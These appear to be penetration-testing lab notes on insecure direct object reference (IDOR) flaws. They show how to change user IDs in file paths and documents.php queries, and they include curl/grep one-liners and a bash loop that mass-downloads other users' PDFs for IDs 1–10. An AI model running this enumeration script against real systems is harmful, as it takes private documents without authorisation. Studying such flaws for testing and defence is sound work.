## Insecure Parameters

**Static File IDOR
```html
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```
- Filing convention: Document_uid_month_year.pdf
- Change uid to access other users' files

**IDOR
```uid
documents.php?uid=1
```
- Change uid to 2
- if uid_filter is enabled, delete it and you may be able to access all data

## Mass Enumeration
- Burp Intruder
- ZAP Fuzzer

Goal: identify the http link, create a file of potential http links for IDOR, run a bash script or Burp or ZAP
1. [CTRL+SHIFT+C] to inspect page
2. Find something like this:
```html
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```
3. curl & grep
```shell-session
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"
```
4. Grep just IDOR
```shell-session
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
```
5. Create script to mass enumerate
```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```
- Downloads documents from employees 1-10
